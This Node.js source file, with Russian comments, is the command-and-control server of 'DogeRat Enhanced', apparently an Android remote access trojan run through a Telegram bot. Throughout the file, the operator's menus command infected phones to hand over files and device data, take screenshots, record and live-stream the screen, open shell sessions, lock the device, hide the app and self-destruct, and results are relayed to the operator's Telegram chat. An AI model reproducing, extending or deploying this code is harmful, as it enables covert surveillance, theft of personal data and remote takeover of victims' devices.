const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Импорт модулей Enhanced функций
const TaskScheduler = require('./modules/scheduler');
const SecurityManager = require('./modules/security');
const FileManager = require('./modules/fileManager');
const NetworkTools = require('./modules/networkTools');
const ScreencastManager = require('./modules/screencast');
const ShellManager = require('./modules/shell');

// Загрузка конфигурации
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// Инициализация Express и Socket.IO
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Инициализация Telegram бота
const bot = new TelegramBot(data.token, { polling: true });

// Настройка multer для загрузки файлов
const upload = multer({ dest: 'uploads/' });

// Хранилище данных приложения
const appData = new Map();
const deviceSessions = new Map();
const commandHistory = [];
const scheduledTasks = new Map();

// Инициализация модулей Enhanced функций
const taskScheduler = new TaskScheduler();
const securityManager = new SecurityManager();
const fileManager = new FileManager();
const networkTools = new NetworkTools();
const screencastManager = new ScreencastManager();
const shellManager = new ShellManager();

// Расширенные команды
const enhancedActions = [
    '🔧 System Info',
    '📁 File Manager', 
    '🌐 Network Tools',
    '📊 Performance Monitor',
    '⏰ Task Scheduler',
    '🔒 Security Tools',
    '📺 Screen Sharing',
    '🐚 Shell Access',
    '📝 Command History',
    '🔄 Auto Actions',
    '📱 Device Control',
    '🎯 Quick Actions'
];

// Логирование команд
function logCommand(deviceId, command, timestamp = new Date()) {
    const logEntry = {
        deviceId,
        command,
        timestamp,
        id: crypto.randomUUID()
    };
    commandHistory.push(logEntry);
    
    // Ограничиваем историю последними 1000 командами
    if (commandHistory.length > 1000) {
        commandHistory.shift();
    }
    
    // Сохраняем в файл
    fs.appendFileSync('command_history.log', 
        `${timestamp.toISOString()} | ${deviceId} | ${command}\n`);
}

// Функция для создания клавиатуры
function createKeyboard(buttons, columns = 2) {
    const keyboard = [];
    for (let i = 0; i < buttons.length; i += columns) {
        keyboard.push(buttons.slice(i, i + columns));
    }
    return keyboard;
}

// Главное меню
function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['📱 Devices', '🔧 Enhanced Tools'],
                ['📊 Statistics', '⚙️ Settings'],
                ['❓ Help', '🔄 Refresh']
            ],
            resize_keyboard: true
        }
    };
}

// Меню расширенных инструментов
function getEnhancedToolsMenu() {
    return {
        reply_markup: {
            keyboard: createKeyboard(enhancedActions),
            resize_keyboard: true
        }
    };
}

// Системная информация
function getSystemInfoMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['💾 Memory Info', '🔋 Battery Status'],
                ['🌡️ Temperature', '📱 Device Specs'],
                ['🔄 Running Processes', '📊 CPU Usage'],
                ['🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Файловый менеджер
function getFileManagerMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['📂 Browse Folders', '🔍 Search Files'],
                ['⬆️ Upload File', '⬇️ Download File'],
                ['📁 Create Folder', '🗑️ Delete Item'],
                ['🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Сетевые инструменты
function getNetworkToolsMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['📶 WiFi Scan', '🌐 Connection Info'],
                ['🏓 Ping Test', '🛣️ Traceroute'],
                ['⚡ Speed Test', '🔍 Port Scan'],
                ['🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Планировщик задач
function getSchedulerMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['➕ Add Task', '📋 View Tasks'],
                ['✏️ Edit Task', '🗑️ Delete Task'],
                ['▶️ Run Task', '⏸️ Pause Task'],
                ['🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Инструменты безопасности
function getSecurityToolsMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['🔒 Lock Device', '🔓 Unlock Device'],
                ['💥 Self Destruct', '👻 Hide App'],
                ['🔐 Encrypt Data', '🔓 Decrypt Data'],
                ['🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Меню трансляции экрана
function getScreenSharingMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['📸 Take Screenshot', '🎬 Start Recording'],
                ['📺 Start Live Stream', '⏹️ Stop Stream'],
                ['📋 View Screenshots', '🎥 View Recordings'],
                ['📊 Stream Stats', '🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Меню Shell доступа
function getShellAccessMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['🆕 New Shell Session', '📋 Active Sessions'],
                ['⌨️ Execute Command', '📝 Command History'],
                ['📚 Available Commands', '🔒 Close Session'],
                ['📊 Shell Stats', '🔙 Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// Обработка подключения устройств
io.on('connection', (socket) => {
    const deviceId = socket.handshake.headers.host + '-' + (socket.handshake.headers.model || 'unknown');
    const deviceModel = socket.handshake.headers.model || 'Unknown Device';
    const deviceIP = socket.handshake.headers.ip || socket.handshake.address;
    
    socket.deviceId = deviceId;
    socket.deviceModel = deviceModel;
    
    // Сохраняем информацию о сессии
    deviceSessions.set(deviceId, {
        socket: socket,
        model: deviceModel,
        ip: deviceIP,
        connectedAt: new Date(),
        lastSeen: new Date(),
        status: 'online'
    });
    
    console.log(`📱 Device connected: ${deviceId}`);
    
    // Уведомление о подключении
    const connectionMsg = `🟢 <b>New Device Connected</b>\n\n` +
        `📱 <b>Device:</b> ${deviceId}\n` +
        `🏷️ <b>Model:</b> ${deviceModel}\n` +
        `🌐 <b>IP:</b> ${deviceIP}\n` +
        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
        `Total devices: ${deviceSessions.size}`;
    
    bot.sendMessage(data.id, connectionMsg, { parse_mode: 'HTML' });
    
    // Обработка отключения
    socket.on('disconnect', () => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.status = 'offline';
            session.disconnectedAt = new Date();
        }
        
        console.log(`📱 Device disconnected: ${deviceId}`);
        
        const disconnectionMsg = `🔴 <b>Device Disconnected</b>\n\n` +
            `📱 <b>Device:</b> ${deviceId}\n` +
            `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `Active devices: ${Array.from(deviceSessions.values()).filter(s => s.status === 'online').length}`;
        
        bot.sendMessage(data.id, disconnectionMsg, { parse_mode: 'HTML' });
    });
    
    // Обработка ответов от устройства
    socket.on('response', (data) => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.lastSeen = new Date();
        }
        
        // Обработка различных типов ответов
        handleDeviceResponse(deviceId, data);
    });
    
    // Heartbeat для отслеживания активности
    socket.on('heartbeat', () => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.lastSeen = new Date();
        }
    });
});

// Обработка ответов от устройств
function handleDeviceResponse(deviceId, responseData) {
    const { type, data: content, timestamp } = responseData;
    
    let message = '';
    
    switch (type) {
        case 'system_info':
            message = formatSystemInfo(deviceId, content);
            break;
        case 'file_list':
            message = formatFileList(deviceId, content);
            break;
        case 'network_info':
            message = formatNetworkInfo(deviceId, content);
            break;
        case 'performance_data':
            message = formatPerformanceData(deviceId, content);
            break;
        case 'error':
            message = `❌ <b>Error from ${deviceId}:</b>\n${content.message}`;
            break;
        default:
            message = `📱 <b>Response from ${deviceId}:</b>\n${JSON.stringify(content, null, 2)}`;
    }
    
    bot.sendMessage(data.id, message, { parse_mode: 'HTML' });
}

// Форматирование системной информации
function formatSystemInfo(deviceId, info) {
    return `🔧 <b>System Info - ${deviceId}</b>\n\n` +
        `📱 <b>Model:</b> ${info.model || 'Unknown'}\n` +
        `🤖 <b>Android:</b> ${info.androidVersion || 'Unknown'}\n` +
        `💾 <b>RAM:</b> ${info.totalRAM || 'Unknown'} / ${info.availableRAM || 'Unknown'}\n` +
        `💿 <b>Storage:</b> ${info.totalStorage || 'Unknown'} / ${info.freeStorage || 'Unknown'}\n` +
        `🔋 <b>Battery:</b> ${info.batteryLevel || 'Unknown'}%\n` +
        `🌡️ <b>Temperature:</b> ${info.temperature || 'Unknown'}°C\n` +
        `📶 <b>Signal:</b> ${info.signalStrength || 'Unknown'}\n` +
        `🌐 <b>Network:</b> ${info.networkType || 'Unknown'}`;
}

// Форматирование списка файлов
function formatFileList(deviceId, files) {
    let message = `📁 <b>Files - ${deviceId}</b>\n\n`;
    
    if (files.length === 0) {
        message += 'No files found.';
    } else {
        files.slice(0, 20).forEach(file => {
            const icon = file.isDirectory ? '📁' : '📄';
            const size = file.isDirectory ? '' : ` (${formatFileSize(file.size)})`;
            message += `${icon} ${file.name}${size}\n`;
        });
        
        if (files.length > 20) {
            message += `\n... and ${files.length - 20} more files`;
        }
    }
    
    return message;
}

// Форматирование сетевой информации
function formatNetworkInfo(deviceId, info) {
    return `🌐 <b>Network Info - ${deviceId}</b>\n\n` +
        `📶 <b>WiFi:</b> ${info.wifiName || 'Not connected'}\n` +
        `🔒 <b>Security:</b> ${info.wifiSecurity || 'Unknown'}\n` +
        `📡 <b>Signal:</b> ${info.wifiSignal || 'Unknown'} dBm\n` +
        `🌐 <b>IP:</b> ${info.localIP || 'Unknown'}\n` +
        `🌍 <b>Public IP:</b> ${info.publicIP || 'Unknown'}\n` +
        `🚀 <b>Speed:</b> ${info.downloadSpeed || 'Unknown'} / ${info.uploadSpeed || 'Unknown'}\n` +
        `📊 <b>Data Usage:</b> ${info.dataUsage || 'Unknown'}`;
}

// Форматирование данных производительности
function formatPerformanceData(deviceId, data) {
    return `📊 <b>Performance - ${deviceId}</b>\n\n` +
        `🧠 <b>CPU Usage:</b> ${data.cpuUsage || 'Unknown'}%\n` +
        `💾 <b>RAM Usage:</b> ${data.ramUsage || 'Unknown'}%\n` +
        `💿 <b>Storage Usage:</b> ${data.storageUsage || 'Unknown'}%\n` +
        `🔋 <b>Battery:</b> ${data.batteryLevel || 'Unknown'}%\n` +
        `🌡️ <b>Temperature:</b> ${data.temperature || 'Unknown'}°C\n` +
        `⚡ <b>Charging:</b> ${data.isCharging ? 'Yes' : 'No'}`;
}

// Форматирование размера файла
function formatFileSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Отправка команды устройству
function sendCommandToDevice(deviceId, command, extras = []) {
    if (deviceId === 'all') {
        // Отправка всем устройствам
        deviceSessions.forEach((session, id) => {
            if (session.status === 'online') {
                session.socket.emit('command', { request: command, extras });
                logCommand(id, command);
            }
        });
    } else {
        const session = deviceSessions.get(deviceId);
        if (session && session.status === 'online') {
            session.socket.emit('command', { request: command, extras });
            logCommand(deviceId, command);
        } else {
            bot.sendMessage(data.id, `❌ Device ${deviceId} is not online`);
        }
    }
}

// Обработка команд от Telegram бота
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // Проверка авторизации
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '❌ Unauthorized access');
        return;
    }
    
    // Обработка команд
    switch (text) {
        case '/start':
            bot.sendMessage(chatId, 
                '🤖 <b>DogeRat Enhanced Control Panel</b>\n\n' +
                '🚀 Welcome to the enhanced version with advanced features!\n\n' +
                '📱 Connected devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'online').length + '\n' +
                '📊 Total sessions: ' + deviceSessions.size + '\n' +
                '📝 Commands logged: ' + commandHistory.length,
                { parse_mode: 'HTML', ...getMainMenu() }
            );
            break;
            
        case '📱 Devices':
            showDeviceList(chatId);
            break;
            
        case '🔧 Enhanced Tools':
            bot.sendMessage(chatId, 
                '🔧 <b>Enhanced Tools</b>\n\nSelect a tool category:',
                { parse_mode: 'HTML', ...getEnhancedToolsMenu() }
            );
            break;
            
        case '🔧 System Info':
            bot.sendMessage(chatId,
                '🔧 <b>System Information Tools</b>\n\nSelect an option:',
                { parse_mode: 'HTML', ...getSystemInfoMenu() }
            );
            break;
            
        case '📁 File Manager':
            bot.sendMessage(chatId,
                '📁 <b>File Manager</b>\n\nSelect an action:',
                { parse_mode: 'HTML', ...getFileManagerMenu() }
            );
            break;
            
        case '🌐 Network Tools':
            bot.sendMessage(chatId,
                '🌐 <b>Network Tools</b>\n\nSelect a network tool:',
                { parse_mode: 'HTML', ...getNetworkToolsMenu() }
            );
            break;
            
        case '⏰ Task Scheduler':
            bot.sendMessage(chatId,
                '⏰ <b>Task Scheduler</b>\n\nManage scheduled tasks:',
                { parse_mode: 'HTML', ...getSchedulerMenu() }
            );
            break;
            
        case '🔒 Security Tools':
            bot.sendMessage(chatId,
                '🔒 <b>Security Tools</b>\n\n⚠️ Use with caution!',
                { parse_mode: 'HTML', ...getSecurityToolsMenu() }
            );
            break;
            
        case '📺 Screen Sharing':
            bot.sendMessage(chatId,
                '📺 <b>Screen Sharing</b>\n\nCapture and stream device screens:',
                { parse_mode: 'HTML', ...getScreenSharingMenu() }
            );
            break;
            
        case '🐚 Shell Access':
            bot.sendMessage(chatId,
                '🐚 <b>Shell Access</b>\n\nExecute commands on devices:',
                { parse_mode: 'HTML', ...getShellAccessMenu() }
            );
            break;
            
        case '📊 Statistics':
            showStatistics(chatId);
            break;
            
        case '📝 Command History':
            showCommandHistory(chatId);
            break;
            
        // Системная информация
        case '💾 Memory Info':
            selectDeviceForAction(chatId, 'get_memory_info');
            break;
            
        case '🔋 Battery Status':
            selectDeviceForAction(chatId, 'get_battery_status');
            break;
            
        case '🌡️ Temperature':
            selectDeviceForAction(chatId, 'get_temperature');
            break;
            
        case '📱 Device Specs':
            selectDeviceForAction(chatId, 'get_device_specs');
            break;
            
        case '🔄 Running Processes':
            selectDeviceForAction(chatId, 'get_running_processes');
            break;
            
        case '📊 CPU Usage':
            selectDeviceForAction(chatId, 'get_cpu_usage');
            break;
            
        // Файловый менеджер
        case '📂 Browse Folders':
            selectDeviceForAction(chatId, 'browse_folders');
            break;
            
        case '🔍 Search Files':
            appData.set('currentAction', 'search_files');
            bot.sendMessage(chatId, 
                '🔍 <b>Search Files</b>\n\nEnter search query (filename or extension):',
                { parse_mode: 'HTML' }
            );
            break;
            
        // Сетевые инструменты
        case '📶 WiFi Scan':
            selectDeviceForAction(chatId, 'wifi_scan');
            break;
            
        case '🌐 Connection Info':
            selectDeviceForAction(chatId, 'connection_info');
            break;
            
        case '🏓 Ping Test':
            appData.set('currentAction', 'ping_test');
            bot.sendMessage(chatId,
                '🏓 <b>Ping Test</b>\n\nEnter hostname or IP address:',
                { parse_mode: 'HTML' }
            );
            break;
            
        case '⚡ Speed Test':
            selectDeviceForAction(chatId, 'speed_test');
            break;
            
        // Безопасность
        case '🔒 Lock Device':
            selectDeviceForAction(chatId, 'lock_device');
            break;
            
        case '💥 Self Destruct':
            bot.sendMessage(chatId,
                '💥 <b>⚠️ DANGER ZONE ⚠️</b>\n\n' +
                'This will permanently remove the app from the device!\n\n' +
                'Type "CONFIRM DESTRUCT" to proceed:',
                { parse_mode: 'HTML' }
            );
            appData.set('currentAction', 'confirm_destruct');
            break;
            
        // Screen Sharing команды
        case '📸 Take Screenshot':
            selectDeviceForAction(chatId, 'take_screenshot');
            break;
            
        case '🎬 Start Recording':
            selectDeviceForAction(chatId, 'start_recording');
            break;
            
        case '📺 Start Live Stream':
            selectDeviceForAction(chatId, 'start_live_stream');
            break;
            
        case '⏹️ Stop Stream':
            selectDeviceForAction(chatId, 'stop_stream');
            break;
            
        case '📋 View Screenshots':
            showScreenshots(chatId);
            break;
            
        case '🎥 View Recordings':
            showRecordings(chatId);
            break;
            
        case '📊 Stream Stats':
            showStreamStats(chatId);
            break;
            
        // Shell Access команды
        case '🆕 New Shell Session':
            selectDeviceForAction(chatId, 'new_shell_session');
            break;
            
        case '📋 Active Sessions':
            showActiveSessions(chatId);
            break;
            
        case '⌨️ Execute Command':
            appData.set('currentAction', 'execute_shell_command');
            bot.sendMessage(chatId,
                '⌨️ <b>Execute Shell Command</b>\n\nEnter command to execute:',
                { parse_mode: 'HTML' }
            );
            break;
            
        case '📝 Command History':
            showShellHistory(chatId);
            break;
            
        case '📚 Available Commands':
            showAvailableCommands(chatId);
            break;
            
        case '🔒 Close Session':
            selectShellSessionToClose(chatId);
            break;
            
        case '📊 Shell Stats':
            showShellStats(chatId);
            break;
            
        case '🔙 Back to Tools':
            bot.sendMessage(chatId, 
                '🔧 <b>Enhanced Tools</b>\n\nSelect a tool category:',
                { parse_mode: 'HTML', ...getEnhancedToolsMenu() }
            );
            break;
            
        case '🔄 Refresh':
            bot.sendMessage(chatId, 
                '🔄 <b>Status Refreshed</b>\n\n' +
                '📱 Online devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'online').length + '\n' +
                '💤 Offline devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'offline').length + '\n' +
                '📝 Commands today: ' + commandHistory.filter(c => c.timestamp.toDateString() === new Date().toDateString()).length,
                { parse_mode: 'HTML', ...getMainMenu() }
            );
            break;
            
        default:
            handleCustomInput(chatId, text);
    }
});

// Показать список устройств
function showDeviceList(chatId) {
    const onlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'online');
    const offlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'offline');
    
    let message = '📱 <b>Device List</b>\n\n';
    
    if (onlineDevices.length > 0) {
        message += '🟢 <b>Online Devices:</b>\n';
        onlineDevices.forEach((session, index) => {
            const deviceId = Array.from(deviceSessions.keys())[Array.from(deviceSessions.values()).indexOf(session)];
            message += `${index + 1}. ${deviceId}\n`;
            message += `   📱 ${session.model}\n`;
            message += `   🌐 ${session.ip}\n`;
            message += `   ⏰ Connected: ${session.connectedAt.toLocaleTimeString()}\n\n`;
        });
    }
    
    if (offlineDevices.length > 0) {
        message += '🔴 <b>Offline Devices:</b>\n';
        offlineDevices.slice(0, 5).forEach((session, index) => {
            const deviceId = Array.from(deviceSessions.keys())[Array.from(deviceSessions.values()).indexOf(session)];
            message += `${index + 1}. ${deviceId}\n`;
            message += `   📱 ${session.model}\n`;
            message += `   ⏰ Last seen: ${session.lastSeen.toLocaleTimeString()}\n\n`;
        });
        
        if (offlineDevices.length > 5) {
            message += `... and ${offlineDevices.length - 5} more offline devices\n\n`;
        }
    }
    
    if (onlineDevices.length === 0 && offlineDevices.length === 0) {
        message += 'No devices found.';
    }
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// Выбор устройства для действия
function selectDeviceForAction(chatId, action) {
    const onlineDevices = Array.from(deviceSessions.entries()).filter(([id, session]) => session.status === 'online');
    
    if (onlineDevices.length === 0) {
        bot.sendMessage(chatId, '❌ No online devices available');
        return;
    }
    
    appData.set('pendingAction', action);
    
    const keyboard = onlineDevices.map(([deviceId, session]) => [deviceId]);
    keyboard.push(['🌐 All Devices']);
    keyboard.push(['❌ Cancel']);
    
    bot.sendMessage(chatId, 
        `🎯 <b>Select Device</b>\n\nChoose a device for action: <b>${action}</b>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        }
    );
}

// Показать статистику
function showStatistics(chatId) {
    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    
    const todayCommands = commandHistory.filter(c => c.timestamp >= today).length;
    const totalDevices = deviceSessions.size;
    const onlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'online').length;
    
    const message = '📊 <b>Statistics</b>\n\n' +
        `📱 <b>Devices:</b>\n` +
        `   • Total: ${totalDevices}\n` +
        `   • Online: ${onlineDevices}\n` +
        `   • Offline: ${totalDevices - onlineDevices}\n\n` +
        `📝 <b>Commands:</b>\n` +
        `   • Today: ${todayCommands}\n` +
        `   • Total: ${commandHistory.length}\n\n` +
        `⏰ <b>Uptime:</b> ${getUptime()}\n` +
        `💾 <b>Memory Usage:</b> ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB`;
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// Показать историю команд
function showCommandHistory(chatId) {
    const recentCommands = commandHistory.slice(-20).reverse();
    
    let message = '📝 <b>Recent Commands</b>\n\n';
    
    if (recentCommands.length === 0) {
        message += 'No commands in history.';
    } else {
        recentCommands.forEach((cmd, index) => {
            message += `${index + 1}. <b>${cmd.command}</b>\n`;
            message += `   📱 ${cmd.deviceId}\n`;
            message += `   ⏰ ${cmd.timestamp.toLocaleString()}\n\n`;
        });
    }
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// Обработка пользовательского ввода
function handleCustomInput(chatId, text) {
    const currentAction = appData.get('currentAction');
    const pendingAction = appData.get('pendingAction');
    
    // Проверка на выбор устройства
    if (pendingAction) {
        if (text === '❌ Cancel') {
            appData.delete('pendingAction');
            bot.sendMessage(chatId, '❌ Action cancelled', getMainMenu());
            return;
        }
        
        const deviceId = text === '🌐 All Devices' ? 'all' : text;
        sendCommandToDevice(deviceId, pendingAction);
        appData.delete('pendingAction');
        
        bot.sendMessage(chatId, 
            `✅ Command sent to ${deviceId === 'all' ? 'all devices' : deviceId}`,
            getMainMenu()
        );
        return;
    }
    
    // Обработка специальных действий
    switch (currentAction) {
        case 'search_files':
            const searchQuery = text;
            selectDeviceForAction(chatId, `search_files:${searchQuery}`);
            appData.delete('currentAction');
            break;
            
        case 'ping_test':
            const target = text;
            selectDeviceForAction(chatId, `ping:${target}`);
            appData.delete('currentAction');
            break;
            
        case 'confirm_destruct':
            if (text === 'CONFIRM DESTRUCT') {
                selectDeviceForAction(chatId, 'self_destruct');
                appData.delete('currentAction');
            } else {
                bot.sendMessage(chatId, '❌ Confirmation failed. Self-destruct cancelled.', getMainMenu());
                appData.delete('currentAction');
            }
            break;
            
        case 'execute_shell_command':
            const command = text;
            appData.set('pendingShellCommand', command);
            selectDeviceForAction(chatId, 'execute_shell_command');
            appData.delete('currentAction');
            break;
            
        case 'close_shell_session':
            if (text === '❌ Cancel') {
                bot.sendMessage(chatId, '❌ Action cancelled', getMainMenu());
                appData.delete('currentAction');
            } else if (text.startsWith('🔒 ')) {
                const sessionId = text.replace('🔒 ', '');
                const success = shellManager.closeSession(sessionId, 'manual');
                
                if (success) {
                    bot.sendMessage(chatId, 
                        `✅ Shell session ${sessionId} closed successfully`,
                        getMainMenu()
                    );
                } else {
                    bot.sendMessage(chatId, 
                        `❌ Failed to close session ${sessionId}`,
                        getMainMenu()
                    );
                }
                appData.delete('currentAction');
            }
            break;
            
        default:
            bot.sendMessage(chatId, '❓ Unknown command. Use the menu buttons.', getMainMenu());
    }
}

// Получить время работы сервера
function getUptime() {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    return `${hours}h ${minutes}m`;
}

// Функции для Screen Sharing
function showScreenshots(chatId) {
    const screenshots = screencastManager.getScreenshots();
    const message = screencastManager.formatScreenshotsForTelegram(screenshots);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showRecordings(chatId) {
    const recordings = screencastManager.getRecordings();
    const message = screencastManager.formatRecordingsForTelegram(recordings);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showStreamStats(chatId) {
    const message = screencastManager.formatStatsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// Функции для Shell Access
function showActiveSessions(chatId) {
    const sessions = shellManager.getActiveSessions();
    
    if (sessions.length === 0) {
        bot.sendMessage(chatId, 
            '🐚 <b>Active Shell Sessions</b>\n\nNo active sessions found.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    let message = '🐚 <b>Active Shell Sessions</b>\n\n';
    sessions.forEach((session, index) => {
        const uptime = Math.round(session.uptime / 1000);
        const lastActivity = Math.round((Date.now() - session.lastActivity) / 1000);
        
        message += `${index + 1}. <b>${session.id}</b>\n`;
        message += `   📱 Device: ${session.deviceId}\n`;
        message += `   ⏱️ Uptime: ${uptime}s\n`;
        message += `   🕐 Last activity: ${lastActivity}s ago\n`;
        message += `   ⌨️ Commands: ${session.commandCount}\n\n`;
    });
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showShellHistory(chatId) {
    // Получаем последнюю активную сессию или запрашиваем выбор
    const activeSessions = shellManager.getActiveSessions();
    
    if (activeSessions.length === 0) {
        bot.sendMessage(chatId,
            '🐚 <b>Shell History</b>\n\nNo active sessions found.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    // Показываем историю первой активной сессии
    const sessionId = activeSessions[0].id;
    const message = shellManager.formatHistoryForTelegram(sessionId);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showAvailableCommands(chatId) {
    const message = shellManager.formatCommandsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function selectShellSessionToClose(chatId) {
    const sessions = shellManager.getActiveSessions();
    
    if (sessions.length === 0) {
        bot.sendMessage(chatId,
            '🐚 <b>Close Session</b>\n\nNo active sessions to close.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    const keyboard = sessions.map(session => [`🔒 ${session.id}`]);
    keyboard.push(['❌ Cancel']);
    
    appData.set('currentAction', 'close_shell_session');
    bot.sendMessage(chatId,
        '🔒 <b>Select Session to Close</b>\n\nChoose a session:',
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        }
    );
}

function showShellStats(chatId) {
    const message = shellManager.formatStatsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// Автоматические отчеты (каждые 6 часов)
setInterval(() => {
    const onlineCount = Array.from(deviceSessions.values()).filter(s => s.status === 'online').length;
    const todayCommands = commandHistory.filter(c => 
        c.timestamp.toDateString() === new Date().toDateString()
    ).length;
    
    const report = `📊 <b>Automatic Report</b>\n\n` +
        `📱 Online devices: ${onlineCount}\n` +
        `📝 Commands today: ${todayCommands}\n` +
        `⏰ Time: ${new Date().toLocaleString()}`;
    
    bot.sendMessage(data.id, report, { parse_mode: 'HTML' });
}, 6 * 60 * 60 * 1000); // 6 часов

// Запуск сервера
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Enhanced DogeRat server running on port ${PORT}`);
    console.log(`📱 Telegram bot active`);
    console.log(`🔧 Enhanced features enabled`);
});

// Обработка ошибок
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    bot.sendMessage(data.id, `❌ Server Error: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    bot.sendMessage(data.id, `❌ Server Warning: Unhandled promise rejection`);
});